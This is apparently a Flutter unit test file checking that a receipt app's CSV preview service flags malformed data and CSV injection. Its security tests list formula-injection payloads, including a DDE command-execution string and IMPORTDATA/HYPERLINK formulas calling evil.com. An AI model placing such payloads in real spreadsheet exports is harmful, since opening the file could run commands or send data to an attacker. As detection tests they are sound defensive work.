import 'package:flutter_test/flutter_test.dart';
import 'package:mockito/annotations.dart';
import 'package:mockito/mockito.dart';
import 'package:receipt_organizer/data/models/receipt.dart';
import 'package:receipt_organizer/domain/services/csv_export_service.dart';
import 'package:receipt_organizer/features/export/domain/services/csv_preview_service.dart';

import 'csv_preview_service_test.mocks.dart';

@GenerateMocks([CSVExportService])
void main() {
  late CSVPreviewService service;
  late MockCSVExportService mockExportService;

  setUp(() {
    mockExportService = MockCSVExportService();
    service = CSVPreviewService(exportService: mockExportService);
  });

  group('CSVPreviewService', () {
    group('generatePreview', () {
      test('should generate preview with first 5 rows', () async {
        // Arrange
        final receipts = _createTestReceipts(10);
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,Test Store,100.00,10.00,Test note
01/16/2024,Another Store,200.00,20.00,
01/17/2024,Third Store,300.00,30.00,
01/18/2024,Fourth Store,400.00,40.00,
01/19/2024,Fifth Store,500.00,50.00,''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        expect(result.previewRows.length, 6); // Header + 5 data rows
        expect(result.totalCount, 10);
        expect(result.previewRows[0], ['Date', 'Merchant', 'Amount', 'Tax', 'Notes']);
        verify(mockExportService.generateCSVContent(
          argThat(hasLength(5)), // Only first 5 receipts
          format,
        )).called(1);
      });

      test('should complete in less than 100ms (PERF-001)', () async {
        // Arrange
        final receipts = _createTestReceipts(100);
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,Test Store,100.00,10.00,Test note
01/16/2024,Another Store,200.00,20.00,
01/17/2024,Third Store,300.00,30.00,
01/18/2024,Fourth Store,400.00,40.00,
01/19/2024,Fifth Store,500.00,50.00,''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        expect(result.generationTime.inMilliseconds, lessThan(100));
      });

      test('should detect CSV injection attempts (SEC-001)', () async {
        // Arrange
        final receipts = [
          _createReceipt(merchantName: '=cmd|"/c calc"'), // Malicious
          _createReceipt(merchantName: '+SUM(A1:A10)'), // Formula injection
          _createReceipt(merchantName: '@SUM(A1:A10)'), // Formula injection
          _createReceipt(merchantName: '-2+3*5'), // Math expression
          _createReceipt(merchantName: 'Normal Store'), // Safe
        ];
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,=cmd|"/c calc",100.00,10.00,
01/16/2024,+SUM(A1:A10),200.00,20.00,
01/17/2024,@SUM(A1:A10),300.00,30.00,
01/18/2024,-2+3*5,400.00,40.00,
01/19/2024,Normal Store,500.00,50.00,''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        final criticalWarnings = result.warnings
            .where((w) => w.severity == WarningSeverity.critical)
            .toList();
        
        expect(criticalWarnings.length, greaterThanOrEqualTo(4)); // 4 malicious entries
        expect(criticalWarnings.every((w) => 
          w.message.contains('CSV injection')), true);
      });

      test('should validate required fields', () async {
        // Arrange
        final receipts = [
          _createReceipt(merchantName: ''), // Missing merchant
          _createReceipt(totalAmount: null), // Missing amount
        ];
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,,100.00,10.00,
01/16/2024,Test Store,,20.00,''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        final highWarnings = result.warnings
            .where((w) => w.severity == WarningSeverity.high)
            .toList();
        
        expect(highWarnings.length, greaterThanOrEqualTo(2));
        expect(highWarnings.any((w) => 
          w.message.contains('Required field')), true);
      });

      test('should use cache for repeated requests', () async {
        // Arrange
        final receipts = _createTestReceipts(5);
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,Test Store,100.00,10.00,Test note''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act - First call
        await service.generatePreview(receipts, format);
        
        // Act - Second call (should use cache)
        final result2 = await service.generatePreview(receipts, format);

        // Assert
        verify(mockExportService.generateCSVContent(any, format))
            .called(1); // Only called once due to caching
        expect(result2.previewRows.length, greaterThan(0));
      });

      test('should handle empty receipt list', () async {
        // Arrange
        final receipts = <Receipt>[];
        const format = ExportFormat.quickbooks;
        const csvContent = 'Date,Merchant,Amount,Tax,Notes';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        expect(result.previewRows.length, 1); // Only header
        expect(result.totalCount, 0);
        expect(result.warnings, isEmpty);
      });

      test('should detect malformed amount values', () async {
        // Arrange
        final receipts = [_createReceipt()];
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,Test Store,invalid_amount,10.00,''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        final mediumWarnings = result.warnings
            .where((w) => w.severity == WarningSeverity.medium)
            .toList();
        
        expect(mediumWarnings.any((w) => 
          w.message.contains('Invalid amount format')), true);
      });

      test('should match export exactly (DATA-001)', () async {
        // Arrange
        final receipts = _createTestReceipts(3);
        const format = ExportFormat.xero;
        const expectedCsv = '''Date,Supplier,Total,GST,Description
15/01/2024,Test Store,100.00,10.00,Test note
16/01/2024,Test Store,100.00,10.00,Test note
17/01/2024,Test Store,100.00,10.00,Test note''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(expectedCsv);

        // Act
        final result = await service.generatePreview(receipts, format);

        // Assert
        // Verify that preview uses exact same CSV generation logic
        verify(mockExportService.generateCSVContent(
          argThat(hasLength(3)),
          format,
        )).called(1);
        
        // Check headers match Xero format
        expect(result.previewRows[0], 
          ['Date', 'Supplier', 'Total', 'GST', 'Description']);
      });

      test('should clear cache on demand', () async {
        // Arrange
        final receipts = _createTestReceipts(5);
        const format = ExportFormat.quickbooks;
        const csvContent = '''Date,Merchant,Amount,Tax,Notes
01/15/2024,Test Store,100.00,10.00,Test note''';

        when(mockExportService.generateCSVContent(any, format))
            .thenReturn(csvContent);

        // Act
        await service.generatePreview(receipts, format); // First call
        service.clearCache();
        await service.generatePreview(receipts, format); // Should not use cache

        // Assert
        verify(mockExportService.generateCSVContent(any, format))
            .called(2); // Called twice because cache was cleared
      });
    });

    group('Security Tests (SEC-001)', () {
      test('should detect all OWASP injection patterns', () async {
        // Test various injection attempts
        final maliciousInputs = [
          '=cmd|"/c calc"',
          '=1+1',
          '@SUM(A1:A10)',
          '+SUM(B:B)',
          '-2+3*5',
          '=HYPERLINK("http://evil.com")',
          '=IMPORTDATA("http://evil.com/data")',
        ];

        for (final input in maliciousInputs) {
          final receipts = [_createReceipt(merchantName: input)];
          const format = ExportFormat.generic;
          final csvContent = 'Merchant,Date,Amount,Tax,Notes\n$input,01/15/2024,100.00,10.00,';

          when(mockExportService.generateCSVContent(any, format))
              .thenReturn(csvContent);

          final result = await service.generatePreview(receipts, format);
          
          expect(
            result.warnings.any((w) => 
              w.severity == WarningSeverity.critical &&
              w.message.contains('CSV injection')),
            true,
            reason: 'Should detect injection in: $input',
          );
        }
      });
    });
  });
}

// Helper functions
List<Receipt> _createTestReceipts(int count) {
  return List.generate(count, (i) => _createReceipt(
    id: 'receipt_$i',
    merchantName: 'Test Store',
    totalAmount: 100.0 + i,
    taxAmount: 10.0 + i,
    receiptDate: '01/${15 + i}/2024',
    notes: i == 0 ? 'Test note' : null,
  ));
}

Receipt _createReceipt({
  String? id,
  String? merchantName,
  double? totalAmount,
  double? taxAmount,
  String? receiptDate,
  String? notes,
}) {
  return Receipt(
    id: id ?? 'test_id',
    merchantName: merchantName ?? 'Test Merchant',
    totalAmount: totalAmount ?? 100.0,
    taxAmount: taxAmount ?? 10.0,
    receiptDate: receiptDate ?? '01/15/2024',
    notes: notes,
    imagePath: '/path/to/image.jpg',
    status: ReceiptStatus.ready,
    createdAt: DateTime.now(),
    updatedAt: DateTime.now(),
  );
}